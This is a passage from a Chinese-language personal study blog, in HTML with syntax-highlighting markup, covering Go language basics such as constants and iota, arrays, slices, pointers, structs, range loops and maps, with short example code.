class="token string">"abc"</span> <span class="token comment">//隐式声明</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>常量可以用作枚举</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> <span class="token punctuation">(</span>    Unknown <span class="token operator">=</span> <span class="token number">0</span>    Female <span class="token operator">=</span> <span class="token number">1</span>    Male <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>常量表达式中，函数必须是内置函数，否则编译不过</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">const</span> <span class="token punctuation">(</span>a <span class="token operator">=</span> <span class="token string">"abc"</span>b <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>c <span class="token operator">=</span> unsafe<span class="token punctuation">.</span><span class="token function">Sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="特殊常量-iota"><a href="#特殊常量-iota" class="headerlink" title="特殊常量 iota"></a>特殊常量 iota</h3><ol><li><p>  iota，特殊常量，可以认为是一个可以被编译器修改的常量。</p></li><li><p>  iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p></li><li><p>第一个 iota 等于 0，每当 iota 在新的一行被使用时，它的值都会自动加 1</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">(</span>            a <span class="token operator">=</span> <span class="token boolean">iota</span>   <span class="token comment">//0</span>            b          <span class="token comment">//1</span>            c          <span class="token comment">//2</span>            d <span class="token operator">=</span> <span class="token string">"ha"</span>   <span class="token comment">//独立值，iota += 1</span>            e          <span class="token comment">//"ha"   iota += 1</span>            f <span class="token operator">=</span> <span class="token number">100</span>    <span class="token comment">//iota +=1</span>            g          <span class="token comment">//100  iota +=1</span>            h <span class="token operator">=</span> <span class="token boolean">iota</span>   <span class="token comment">//7,恢复计数</span>            i          <span class="token comment">//8</span>    <span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>e<span class="token punctuation">,</span>f<span class="token punctuation">,</span>g<span class="token punctuation">,</span>h<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  我的理解：<strong>第一个iota为0，每更新一行时，iota会自动+1,如果遇到了String类型的数据，String的值不会改变</strong>，在const中枚举，如果重新给某个变量进行了赋值，则会自动摒弃iota</p></li></ol><h2 id="左右移"><a href="#左右移" class="headerlink" title="左右移"></a>左右移</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220924104333.png"></li><li>  左移为 * 2的n次方</li><li>  右移为 / 2的n次方</li></ol><h2 id="go语言条件语句"><a href="#go语言条件语句" class="headerlink" title="go语言条件语句"></a>go语言条件语句</h2><ol><li>  go没有三目运算符，所以不支持 <strong>?:</strong> 形式的条件判断</li><li>  go所有的二目运算符都是从左向右执行的</li><li>  select语句，如果有多个case都可以执行，select会随机公平地选出一个执行，其它的不会执行</li><li>  如果有default子句，则执行该语句</li><li>  如果没有default子句，select将阻塞，直到某个通信可以运行；go不会重新对channel或值进行求值</li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><ol><li><p>for-each循环的<strong>第一个元素肯定是下标，第二个元素才是值</strong></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> i<span class="token punctuation">,</span>s <span class="token operator">:=</span> <span class="token keyword">range</span> strings<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <strong>使用range关键字</strong></p></li></ol><h2 id="循环中的goto语句"><a href="#循环中的goto语句" class="headerlink" title="循环中的goto语句"></a>循环中的goto语句</h2><ol><li>  goto语句可以无条件地转移到过程中指定的行</li><li>  goto语句通常与条件语句配合使用，可用来实现条件转移， 构成循环，跳出循环体等功能</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220924110303.png"></li><li>  goto loop</li></ol><h2 id="go语言数组"><a href="#go语言数组" class="headerlink" title="go语言数组"></a>go语言数组</h2><ol><li><p>  等号右边先定义维度，然后定义类型，最后来个大括号</p></li><li><p>全看：var 数组名 = [size] type {}</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> variable_name <span class="token punctuation">[</span>SIZE<span class="token punctuation">]</span> variable_type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> balance <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token builtin">float32</span> <span class="token comment">//var 数组名 [size] 类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>初始化，等号，大括号</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> balance <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>float<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>也可以通过字面量在声明数组的同时快速初始化数组</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> balance <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>float<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在初始化数组时，如果长度不确定，可以使用 <strong>…</strong> 来代替数组的长度，编译器会根据元素的个数自动推断数组的个数</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> balance <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span>float<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">&#125;</span>balance <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span>float<span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  注意，变量的类型一定在变量名的后面</p></li></ol><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><pre class="line-numbers language-gp" data-language="gp"><code class="language-gp">var variable_name [1][2][3] variable_typevar threedim [1][2][3]int<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>  初始化二维数组</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220924194448.png"></li><li>  如果最后一个元素和结尾的 <strong>}</strong> 不位于同一行，则需要最后元素后添加一个逗号</li><li>  如果位于同一行，则可以不带逗号</li><li>  总之，最后一行的 <strong>}</strong> 不能单独一行</li></ol><h2 id="go指针"><a href="#go指针" class="headerlink" title="go指针"></a>go指针</h2><ol><li>  当一个指针被定义后没有分配到任何变量时，它的值为 <strong>nil</strong></li><li>  nil指针也被称为空指针</li><li>  指针数组存地址，令每一个元素都指向一个值</li></ol><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><ol><li><p>type和struct关键字，type语句设定了结构体的名称</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> name <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>member definition    member    member<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>变量的声明</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">variable_name <span class="token operator">:=</span> structure_variable_name <span class="token punctuation">&#123;</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span>value3<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  当定义结构体时，不一定需要使用某个结构体中的所有属性，即可以有几个属性不带</p></li></ol><h2 id="go语言切片"><a href="#go语言切片" class="headerlink" title="go语言切片"></a>go语言切片</h2><ol><li><p>数组长度不可改变，但是切片的长度是可以改变的，而已追加元素，在追加时可能使切片的容量增大</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> identifier <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">type</span> <span class="token comment">//声明一个未指定大小的数组来定义切片，不建议使用</span><span class="token comment">//或者使用make()函数来创建切片</span><span class="token keyword">var</span> slice1 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">type</span> <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">type</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">)</span>slice1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">type</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token comment">//也可以指定容量，其中capacity为可选参数</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>T<span class="token punctuation">,</span>length<span class="token punctuation">,</span>capacity<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  切片就是没有指定长度的数组</p></li></ol><h3 id="获取数组中的值"><a href="#获取数组中的值" class="headerlink" title="获取数组中的值"></a>获取数组中的值</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">b <span class="token operator">:=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment">//获取数组中的所有值，这也是基于数组的切片定义，此时b是一个切片而不是数组，b没有长度限制</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>  获取切片的值是前包后不包的，即 <strong>[1:4]</strong> 的取值实际上是1~3</li></ol><h3 id="获取切片的长度和容量"><a href="#获取切片的长度和容量" class="headerlink" title="获取切片的长度和容量"></a>获取切片的长度和容量</h3><ol><li>  len()函数来获取切片的长度</li><li>  cap()函数来获取切片的容量</li><li>  <strong>切片容量是从它的第一个元素开始数，到其底层数组元素末尾的个数，如果是基于数组的，就是到其数组的最后一个位置，即使限定了最后的下标[,end]</strong></li><li>  <strong>切片的长度就是它所包含的元素个数</strong></li></ol><h3 id="用make函数创建切片"><a href="#用make函数创建切片" class="headerlink" title="用make函数创建切片"></a>用make函数创建切片</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>T<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">,</span><span class="token builtin">cap</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>  第一个参数是类型，第二个参数是长度，第三个长度是容量</li></ol><h3 id="切片扩容"><a href="#切片扩容" class="headerlink" title="切片扩容"></a>切片扩容</h3><ol><li>  使用go语言内置函数，append()可以为切片动态添加元素，每个切片会指向一个底层数组</li><li>  append()等号前写用哪个变量去接收，append()的第一个参数写地址，第二个参数是添加的值</li></ol><h3 id="切片合并"><a href="#切片合并" class="headerlink" title="切片合并"></a>切片合并</h3><ol><li><p>  append(sliceA,sliceB…)</p></li><li><p>  第一个参数是加到哪里，第二个参数是用什么加，第二个参数后面会自动加上 <strong>…</strong></p></li></ol>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">   sliceA <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"java"</span><span class="token punctuation">&#125;</span>   sliceB <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"nodejs"</span><span class="token punctuation">,</span><span class="token string">"go"</span><span class="token punctuation">&#125;</span>   sliceA <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>sliceA<span class="token punctuation">,</span>sliceB<span class="token operator">...</span><span class="token punctuation">)</span> <span class="token comment">//注意这个地方是重新赋值，而不需要声明，因此不用 := ,用 = ，另外，要在用于扩容的数组后面加上三个点</span>   fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sliceA<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>  上面这个例子是将sliceB合并到sliceA的后面，然后重新赋值给sliceA</li></ol><h3 id="切片是一种引用类型，如果想要不同时改变，则使用copy-函数"><a href="#切片是一种引用类型，如果想要不同时改变，则使用copy-函数" class="headerlink" title="切片是一种引用类型，如果想要不同时改变，则使用copy()函数"></a>切片是一种引用类型，如果想要不同时改变，则使用copy()函数</h3><ol><li><p>  copy()函数是赋值，而不会发生引用</p></li><li><p>即使用copy()函数不会同时修改sliceA和sliceB</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sliceA <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span>    sliceB <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token comment">//第一个参数是被赋值，第二个参数是用什么去赋值，copy(被赋值，用什么去赋值);</span><span class="token function">copy</span><span class="token punctuation">(</span>sliceB<span class="token punctuation">,</span>sliceA<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sliceA<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>sliceB<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="删除切片中的元素"><a href="#删除切片中的元素" class="headerlink" title="删除切片中的元素"></a>删除切片中的元素</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span>a <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span><span class="token comment">//和链表的删除操作思路相同，将一个切片分成两段，前一段和后一段之间是要shan'ch</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> var_name <span class="token operator">*</span>var_type<span class="token keyword">var</span> ip <span class="token operator">*</span><span class="token builtin">int</span><span class="token keyword">var</span> fp <span class="token operator">*</span><span class="token builtin">float32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">const</span> MAX <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> i <span class="token builtin">int</span><span class="token keyword">var</span> ptr <span class="token punctuation">[</span>MAX<span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span>i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"a[%d] = %d"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">*</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="指针作为函数的参数"><a href="#指针作为函数的参数" class="headerlink" title="指针作为函数的参数"></a>指针作为函数的参数</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> a <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token keyword">var</span> b <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">200</span><span class="token function">swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">swap</span><span class="token punctuation">(</span>x <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">,</span>y <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">*</span>x<span class="token punctuation">,</span><span class="token operator">*</span>y <span class="token operator">=</span> <span class="token operator">*</span>y<span class="token punctuation">,</span><span class="token operator">*</span>x<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h2><h3 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> struct_variable_type <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>member definitionmember definition<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  忽略的字段将为0或者为空</p></li><li><p>也可以使用 key=&gt;value 的形式,使用键值对的形式可以不用按照顺序去定义</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">Books<span class="token punctuation">&#123;</span>title<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>author<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>subject<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>book_id<span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="结构体作为函数的参数"><a href="#结构体作为函数的参数" class="headerlink" title="结构体作为函数的参数"></a>结构体作为函数的参数</h3><pre class="line-numbers language-none"><code class="language-none">func printBook(book Books) &#123;fmt.Printf(book.title)&#125;func name(var_name var_type) &#123;fmt.Printf(var_name.value)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> struct_pointer <span class="token operator">*</span>Books<span class="token comment">//使用指针变量存储结构体变量的地址</span>struct_pointer <span class="token operator">=</span> <span class="token operator">&amp;</span>Book1<span class="token comment">//使用结构体指针访问结构体成员</span>struct_pointer<span class="token punctuation">.</span>title<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="范围range"><a href="#范围range" class="headerlink" title="范围range"></a>范围range</h2><ol><li><p>  range用于for循环中迭代数组，切片，通道，集合元素</p></li><li><p>数组和切片中它返回元素的索引和对应的值，在集合中返回key-value对</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token operator">:=</span> <span class="token keyword">range</span> oldMap <span class="token punctuation">&#123;</span>newMap<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>for循环的range可以省略key和value</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    map1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">float32</span><span class="token punctuation">)</span>    map1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.0</span>    map1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2.0</span>        <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token operator">:=</span> <span class="token keyword">range</span> map1 <span class="token punctuation">&#123;</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"key: %d,value %f"</span><span class="token punctuation">,</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> key <span class="token operator">:=</span> <span class="token keyword">range</span> map1 <span class="token punctuation">&#123;</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"key is: %d"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span>value <span class="token operator">:=</span> <span class="token keyword">range</span> map1 <span class="token punctuation">&#123;</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"value is: %f"</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="map集合"><a href="#map集合" class="headerlink" title="map集合"></a>map集合</h2><ol><li><p>  无序的键值对的集合</p></li><li><p>  可以通过key来快速地检索数据，类似于索引，指向数据的值</p></li><li><p>map是一种集合，可以进行迭代，但是是无序的，无法决定它的返回顺序，因为map是通过hash来实现的</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> countryCapitalMap <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span> <span class="token comment">//map的声明: map[键的类型]值的类型</span>countryCapitalMap <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span>countryCapitalMap <span class="token punctuation">[</span><span class="token string">"france"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"巴黎"</span>countryCapitalMap <span class="token punctuation">[</span> <span class="token string">"Italy"</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"罗马"</span>    countryCapitalMap <span class="token punctuation">[</span> <span class="token string">"Japan"</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"东京"</span>    countryCapitalMap <span class="token punctuation">[</span> <span class="token string">"India "</span> <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"新德里"</span><span class="token keyword">for</span> country <span class="token operator">:=</span> <span class="token keyword">range</span> countryCapitalMap <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>country<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><ol><li><p>delete函数用于删除集合的元素，参数为map和其对应的key</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token function">delete</span><span class="token punctuation">(</span>map_name<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token function">delete</span><span class="token punctuation">(</span>map_name<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>countryCapitalMap <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"France"</span><span class="token punctuation">:</span> <span class="token string">"Paris"</span><span class="token punctuation">,</span> <span class="token 